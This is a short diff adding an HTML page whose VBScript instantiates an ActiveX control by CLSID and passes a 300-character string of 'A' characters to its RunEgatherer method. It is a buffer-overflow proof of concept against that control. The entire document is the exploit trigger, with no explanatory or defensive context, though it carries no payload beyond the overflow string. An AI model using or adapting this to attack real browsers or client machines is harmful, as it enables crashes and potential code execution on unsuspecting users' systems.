@@ -1,0 +1,8 @@
+##<html>
+##<object classid='clsid:74FFE28D-2378-11D5-990C-006094235084'
+id='notCompromising'></object>
+##<script language='vbscript'>
+##overflowBuffer=String(300,"A")
+##notCompromising.RunEgatherer overflowBuffer
+##</script>
+
